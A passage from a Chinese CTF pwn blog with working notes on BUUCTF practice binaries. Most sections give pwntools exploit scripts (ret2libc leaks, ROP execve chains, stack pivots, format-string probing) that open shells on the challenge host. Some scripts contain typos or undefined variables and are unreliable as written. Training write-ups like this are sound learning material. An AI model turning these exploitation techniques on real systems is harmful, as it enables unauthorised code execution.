<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27409</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)本地</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#params1</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>)+ p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your input :&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#构建一下libc</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your input :&#x27;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>),system_addr,<span class="string">b&#x27;AAAA&#x27;</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我靠，plt表居然一个函数都没有。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512426.png" alt="image-20240722185306412"></p>
<p>上网找了一手</p>
<p>ROPgadget找一手</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031512868.png" alt="image-20240722185831245"></p>
<p>系统调用的话就应该知道</p>
<p>32位的函数调用过程</p>
<blockquote>
<p>传参方式：首先系统将系统调用号传入eax，然后将参数从左到右依次存入ebx，ecx，edx寄存器，返回值值存在eax寄存器</p>
</blockquote>
<p>使用read函数将”&#x2F;bin&#x2F;sh\x00”读入bss段中,所以这里的sh_addr函数应该不一样</p>
<p>只要在bss段上就行说是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27409</span>)</span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">int_0x80_addr=<span class="number">0x080493e1</span></span><br><span class="line">sh_addr=<span class="number">0x080be238</span></span><br><span class="line">eax_addr=<span class="number">0x080bae06</span> </span><br><span class="line">ret_add=<span class="number">0x080481b2</span></span><br><span class="line">pop_edx_ecx_ebx=<span class="number">0x0806e850</span></span><br><span class="line">read_addr=<span class="number">0x806CD50</span></span><br><span class="line"><span class="comment">#0x0806e829 : pop ebx ; pop edx ; ret</span></span><br><span class="line"><span class="comment">#0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span>+<span class="number">4</span>)+p32(read_addr)+p32(<span class="number">0</span>)+p32(sh_addr)+p32(<span class="number">8</span>)</span><br><span class="line">payload +=p32(eax_addr)+p32(<span class="number">11</span>)++p32(pop_edx_ecx_ebx)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(sg_addr)+(int_0x80_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>flag{a7b21097-c99c-40ff-9a0a-7c0576f58326}</p>
<h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a>wustctf2020_getshell_2</h2><p>2024.7.22</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513683.png" alt="image-20240722202107264"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513056.png" alt="image-20240722202229509"></p>
<p>ida运行一下</p>
<p>read函数加一个简单的后门</p>
<p>再查看后门函数的时候我们可以发现</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513004.png" alt="image-20240722202454628"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607945.png" alt="image-20240722204634597"></p>
<p>简单写一下EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27014</span>)</span><br><span class="line">system_addr=<span class="number">0x80483E0</span></span><br><span class="line">sh_addr=<span class="number">0x08048670</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>感觉没什么问题啊！！！</p>
<p>唉</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27014</span>)</span><br><span class="line">system_addr=<span class="number">0x8048529</span></span><br><span class="line">sh_addr=<span class="number">0x08048670</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(system_addr)+p32(sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="mrctf2020-easyoverflow"><a href="#mrctf2020-easyoverflow" class="headerlink" title="mrctf2020_easyoverflow"></a>mrctf2020_easyoverflow</h2><p>2024.7.23</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513223.png" alt="image-20240723092133947"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607946.png" alt="image-20240723092228267"></p>
<p>扔进ida里面看一眼</p>
<p>溢出的漏洞是gets函数，有个条件能执行system函数</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513878.png" alt=" image-20240723092504020"></p>
<p>check(v5)就是检查v5是否为’n0t_r3@11y_f1@g‘</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513580.png" alt="image-20240723095034454"></p>
<p>V4和V5在一块</p>
<p>思路：v4的输入是用的gets函数，我们可以在读入v4的时候将v5覆写成<code>n0t_r3@11y_f1@g</code>从而获取shell</p>
<p>画一下栈顶的空间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">           +---------------------------+</span><br><span class="line">           |      n0t_r3@11y_f1@g      | 覆盖V5</span><br><span class="line">V5 0x40---&gt;+---------------------------+</span><br><span class="line">           |             a             | a占位填满栈空间</span><br><span class="line">           |            ....           |    ......</span><br><span class="line">           |             a             | a占位填满栈空间</span><br><span class="line">           |             a             | a占位填满栈空间</span><br><span class="line">           |             a             | a占位填满栈空间</span><br><span class="line">           |             a             | a占位填满栈空间</span><br><span class="line">V4 0x70---&gt;+---------------------------+</span><br></pre></td></tr></table></figure>

<p>大概就是这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26485</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>)+<span class="string">b&#x27;n0t_r3@11y_f1@g&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>然后就行了！！</p>
<h2 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a>bbys_tu_2016</h2><p>2024.7.23</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513896.png" alt="image-20240723100653461"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513166.png" alt="image-20240723100724032"></p>
<p>扔进ida里面</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513717.png" alt="image-20240723101141877"></p>
<p>gpt说这个  <code>__isoc99_scanf(&quot;%s&quot;, &amp;v4);</code>存在缓冲区溢出。</p>
<p>不知道能不能像正常的后门进行溢出。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607947.png" alt="image-20240723103613803"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25295</span>)</span><br><span class="line">backdoor=<span class="number">0x804856D</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">4</span>)+p32(backdoor)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><p>2024.7.23</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513193.png" alt="image-20240723104551054"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513762.png" alt="image-20240723104634322"></p>
<p>丢进ida里面看看</p>
<p>应该是一个基本的libc版本泄露,write函数泄露，read函数溢出</p>
<h3 id="write函数泄露libc版本，read函数溢出"><a href="#write函数泄露libc版本，read函数溢出" class="headerlink" title="write函数泄露libc版本，read函数溢出"></a>write函数泄露libc版本，read函数溢出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25041</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=bs<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libic</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="ciscn-2019-s-4"><a href="#ciscn-2019-s-4" class="headerlink" title="ciscn_2019_s_4"></a>ciscn_2019_s_4</h2><p>2024.7.23</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607948.png" alt="image-20240723112658527"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607949.png" alt="image-20240723112747474"></p>
<p>看着像溢出题哈</p>
<p>ida打开，感觉像后门</p>
<p>溢出函数是read函数，感觉长度不够，应该是一个栈迁移</p>
<h3 id="栈迁移-1"><a href="#栈迁移-1" class="headerlink" title="栈迁移"></a>栈迁移</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr= <span class="number">0x8048400</span></span><br></pre></td></tr></table></figure>

<p>利用过程：</p>
<ul>
<li>一、泄露ebp</li>
<li>二、找到参数s在栈上的位置</li>
<li>三、布置s栈上的值</li>
<li>四、栈劫持、获取shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25010</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sys_addr=<span class="number">0x08048400</span></span><br><span class="line">leave_ret=<span class="number">0x008048562</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x8048596&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">buf=leak_addr-<span class="number">0x38</span></span><br><span class="line">payload2=(p32(sys_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(buf+<span class="number">0xc</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h2><p>2024.7.23</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031513416.png" alt="image-20240723193600655"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514952.png" alt="image-20240723193656829"></p>
<p>感觉像溢出的题目哈，丢进ida里面看一眼</p>
<p>呕吼，后门</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=<span class="number">0x4006C6</span></span><br></pre></td></tr></table></figure>

<p>找找漏洞</p>
<p>额，没有</p>
<p>上网！！康康！！</p>
<h3 id="stdout重定向。"><a href="#stdout重定向。" class="headerlink" title="stdout重定向。"></a>stdout重定向。</h3><p>在看了别人的wp之后了解到，原来可以对stdout重定向，将文件描述符 1 重定向到文件描述符 0 ：<br>因此这题不用写exp，直接执行 <code>execv 1&gt;&amp;0</code> ,也就是把标准输出重定向到标准输入，因为默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，所以这条语句相当于重启了标准输出，此时就可以执行命令并且看得到输出了。</p>
<h2 id="ZJCTF-2019-Login"><a href="#ZJCTF-2019-Login" class="headerlink" title="[ZJCTF 2019]Login"></a>[ZJCTF 2019]Login</h2><p>2024.7.23</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514163.png" alt="image-20240723201938323"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514579.png" alt="image-20240723202050290"></p>
<p>ida里面看一看，有system有&#x2F;bin&#x2F;sh</p>
<p>思路如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意到 password_checker 有 call rax 指令，倒推 rax 的来源，在 main 函数中把 rax 的来源覆盖为漏#洞函数的地址即可 get shell</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514982.png" alt="image-20240724100025041"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514842.png" alt="image-20240724101713135"></p>
<p>找到rbp+var_18</p>
<p>看一下栈的情况 </p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514796.png" alt="image-20240724101853280"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25759</span>)</span><br><span class="line"> </span><br><span class="line">backdoor = <span class="number">0x400e88</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;: &#x27;</span>,<span class="string">&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x3a</span>+p64(backdoor))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我是fw</p>
<p>为什么要用空字符占呢？？？？？</p>
<h2 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h2><p>2024.7.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514325.png" alt="image-20240724102719019"></p>
<p>简单运行一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514014.png" alt="image-20240724103014947"></p>
<p>丢进ida里面看一眼</p>
<p>write函数发现溢出漏洞，看一眼感觉是泄露libc基址，</p>
<h3 id="read函数漏洞-write函数泄露libc基址"><a href="#read函数漏洞-write函数泄露libc基址" class="headerlink" title="read函数漏洞,write函数泄露libc基址"></a>read函数漏洞,write函数泄露libc基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29826</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#params</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack1</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libic</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_addr=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#attack2</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h2><p>2024.7.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514327.png" alt="image-20240724110951999"></p>
<p>丢进ida里面</p>
<p>有后门，但是heap，是什么意思呢？</p>
<p>还没学。先放着！！</p>
<h2 id="picoctf-2018-shellcode"><a href="#picoctf-2018-shellcode" class="headerlink" title="picoctf_2018_shellcode"></a>picoctf_2018_shellcode</h2><p>2024.7.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607950.png" alt="image-20240724142026688"></p>
<p>看着像格式化字符串漏洞。丢进ida里面看一眼</p>
<p>放着先！！</p>
<h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>2024.7.24</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514819.png" alt="image-20240724142610468"></p>
<p>丢进ida里面看一眼</p>
<p>格式字符串应该是</p>
<h3 id="格式字符串盲打"><a href="#格式字符串盲打" class="headerlink" title="格式字符串盲打"></a>格式字符串盲打</h3><p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514214.png" alt="image-20240724142916973"></p>
<p>上面的read函数不存在溢出风险</p>
<ul>
<li>找一下偏移</li>
</ul>
<p>baaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031514441.png" alt="image-20240724150601348"></p>
<p>知道偏移为8</p>
<p>利用思路：</p>
<ul>
<li>首先知道偏移</li>
<li>利用printf函数泄露基址</li>
<li>修改GOT表</li>
<li>获得shell</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = 